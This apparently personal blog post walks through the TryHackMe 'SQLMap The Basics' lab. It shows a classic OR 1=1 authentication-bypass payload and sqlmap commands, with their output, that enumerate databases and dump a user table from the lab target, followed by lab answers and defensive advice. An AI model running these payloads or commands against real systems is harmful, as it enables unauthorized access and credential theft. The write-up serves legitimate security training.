---
title: "TryHackMe - Practical Task - SQLMap The Basics"
date: 2026-06-28 00:01:00 +0700
categories: [TryHackMe, Web Exploitation]
tags:
  - tryhackme
  - sql-injection
  - sqlmap
  - database
  - linux
author: NoxShepherd
toc: true
comments: true
---

# Overview

SQL injection is one of the most prevalent and dangerous vulnerabilities in modern web applications. Every day, websites interact with databases to store, retrieve, and modify data — and when that interaction is left unsanitized, attackers can manipulate it to access data they were never supposed to see.

In this walkthrough, I will demonstrate how I solved the **Practical Task: SQLMap The Basics** room on TryHackMe by exploiting a SQL injection vulnerability using the automated tool **SQLMap** — from initial discovery all the way through to dumping credentials from the database.

> ⚠️ **Disclaimer**
> This write-up is intended for **educational purposes only**. All activities were performed inside the TryHackMe isolated training environment.

---

# Learning Objectives

After completing this room, you should understand:

- What SQL injection is and how it works
- How websites interact with databases via SQL queries
- How to use SQLMap to discover and exploit SQL injection vulnerabilities
- How to enumerate databases, tables, and extract records with SQLMap

---

# Background — How SQL Injection Works

## The Normal Flow

When you log into a website, your credentials are sent to a database via an SQL query. For example:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

The database checks both conditions — if both match, it logs you in.

## The Injection

If the application fails to sanitize input, an attacker can break out of the expected query and inject their own logic. For example, submitting:

```
Username: John
Password: abc' OR 1=1;-- -
```

Transforms the query into:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

**Why does this work?**

| Part | Explanation |
|------|-------------|
| `'abc'` | Wrong password — fails the AND check |
| `OR 1=1` | Always true — overrides the failed check |
| `-- -` | Comments out the rest of the query |

Result: The attacker bypasses authentication entirely without knowing the password.

---

# Lab Information

| Item | Value |
|------|-------|
| Platform | TryHackMe |
| Target OS | Windows (Apache/MariaDB) |
| Tool | SQLMap 1.10.6 |

| Machine | IP Address |
|---------|------------|
| Victim Machine | `10.48.131.142` |
| Attacker Machine | `10.48.68.144` |

| Endpoint | Purpose |
|----------|---------|
| `http://10.48.131.142/ai/login` | Login page (entry point) |
| `http://10.48.131.142/ai/includes/user_login?email=test&password=test` | Vulnerable GET parameter |

---

# Enumeration — Finding the Injection Point

The login page at `http://10.48.131.142/ai/login` doesn't show GET parameters in the URL directly. To find the full request with parameters, I used the browser's DevTools:

1. Right-click the page → **Inspect**
2. Go to the **Network** tab
3. Submit test credentials (`test` / `test`)
4. Click the login request to see the full URL

**Captured URL:**

```
http://10.48.131.142/ai/includes/user_login?email=test&password=test
```

---

# Exploitation — Step by Step

## Step 1 — Discover Databases

With the target URL confirmed, I ran SQLMap to enumerate all available databases. The URL is wrapped in single quotes to prevent the shell from misinterpreting the `&` character.

```bash
sqlmap -u 'http://10.48.131.142/ai/includes/user_login?email=test&password=test' \
  --dbs \
  --level=5
```

**Key prompts answered during the scan:**

| Prompt | Answer |
|--------|--------|
| Skip payloads for other DBMSes? | `y` |
| Include all tests for MySQL? | `y` |
| Try with random integer for `--union-char`? | `y` |
| Keep testing other parameters? | `n` |

**SQLMap identified the following injection types on the `email` parameter:**

```
Type: boolean-based blind
Type: error-based (MySQL >= 5.0 OR FLOOR)
Type: time-based blind (SLEEP)
```

**Discovered databases:**

```
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test
```

> **Answer:** There are **6** databases available.

---

## Step 2 — Enumerate Tables in `ai` Database

```bash
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test" \
  -D ai \
  --tables \
  --level=5 \
  --batch
```

The `--batch` flag auto-answers all prompts with default values — no more manual `y/n` inputs.

**Result:**

```
Database: ai
[1 table]
+------+
| user |
+------+
```

> **Answer:** The table name is **user**.

---

## Step 3 — Dump the `user` Table

```bash
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test" \
  -D ai \
  -T user \
  --dump \
  --batch
```

**Result:**

```
Database: ai
Table: user
[1 entry]
+----+-----------------+---------------------+----------+
| id | email           | created             | password |
+----+-----------------+---------------------+----------+
| 1  | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |
+----+-----------------+---------------------+----------+
```

> **Answer:** The password for `test@chatai.com` is **12345678**.

---

# Common Mistakes & Fixes

## Mistake 1 — URL not quoted, `&` breaks the command

```bash
# ❌ Shell treats & as background operator
sqlmap -u http://10.48.131.142/ai/includes/user_login?email=test&password=test

# ✅ Wrap URL in quotes
sqlmap -u "http://10.48.131.142/ai/includes/user_login?email=test&password=test"
```

## Mistake 2 — Answering SQLMap prompts in the wrong terminal

When SQLMap asks `[Y/n]` and the tool is backgrounded, typing `y` or `n` goes to the shell instead. Use `--batch` to avoid this entirely:

```bash
sqlmap -u "..." --batch
```

---

# SQLMap Flag Reference

| Flag | Purpose |
|------|---------|
| `-u "URL"` | Target URL to test |
| `--dbs` | Enumerate all databases |
| `-D dbname` | Select a specific database |
| `--tables` | List tables in the selected database |
| `-T tablename` | Select a specific table |
| `--dump` | Extract all records from the table |
| `--level=5` | Max testing depth (1–5) |
| `--batch` | Auto-answer all prompts with defaults |
| `--cookie="..."` | Include session cookie for authenticated testing |
| `-r file.txt` | Load intercepted POST request from file |

---

# SQL Injection Types Identified

| Type | Description |
|------|-------------|
| Boolean-based blind | Modifies query with always-true boolean expression to infer data |
| Error-based | Forces database errors that leak information in the response |
| Time-based blind | Uses `SLEEP()` delays to infer data when no output is visible |
| UNION-based | Appends extra `SELECT` query to extract data directly |

---

# MITRE ATT&CK Mapping

| Technique ID | Name |
|-------------|------|
| T1190 | Exploit Public-Facing Application |
| T1059 | Command and Scripting Interpreter |
| T1078 | Valid Accounts (post-credential dump) |

---

# OWASP Top 10 Mapping

| Category | Explanation |
|----------|-------------|
| `A03:2021 – Injection` | Unsanitized input allows arbitrary SQL execution |
| `A05:2021 – Security Misconfiguration` | Verbose errors expose DBMS details |
| `A02:2021 – Cryptographic Failures` | Password stored in plaintext (`12345678`) |

---

# Defensive Recommendations

## Preventing SQL Injection

- ❌ Never concatenate raw user input into SQL queries
- ✅ Use **prepared statements** and **parameterized queries**
- ✅ Implement **input validation** on both client and server side
- ✅ Apply the **principle of least privilege** to DB accounts

## Secure Password Storage

- ❌ Never store passwords in plaintext
- ✅ Use strong hashing algorithms: `bcrypt`, `argon2`, or `scrypt`
- ✅ Always salt hashes before storing

## Detection

- Monitor for SQLMap signatures in web server logs (high request volume, `SLEEP`, `UNION SELECT`, `EXTRACTVALUE` patterns)
- Alert on unusual query patterns or error spikes from the database layer
- Use a WAF (Web Application Firewall) to block common injection payloads

---

# Questions & Answers

| Question | Answer |
|----------|--------|
| Which language builds the interaction between a website and its database? | `SQL` |
| Which boolean operator checks if at least one side is true? | `OR` |
| Is `1=1` in an SQL query always true? | `Yea` |
| Which flag extracts all available databases? | `--dbs` |
| Full command to extract tables from `members` database? | `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables` |
| How many databases are available in this web application? | `6` |
| What is the name of the table in the `ai` database? | `user` |
| What is the password of `test@chatai.com`? | `12345678` |

---

# Lessons Learned

This room reinforced how **SQL injection** remains one of the most impactful vulnerabilities in web security. Even a single unsanitized input field can expose an entire database — including credentials, personal data, and system metadata.

SQLMap dramatically reduces the manual effort required to discover and exploit these vulnerabilities, making it an essential tool in any red teamer's arsenal. However, understanding what's happening under the hood — the injection types, the query manipulation, and the database enumeration process — is what separates a skilled operator from someone just running scripts.

For **penetration testers**, knowing when and how to use `--level`, `--batch`, and `--cookie` flags makes the difference between a successful engagement and a failed scan. For **defenders**, parameterized queries and proper credential storage are non-negotiable baselines.

---

*Written by NoxShepherd — TryHackMe Walkthrough Series*
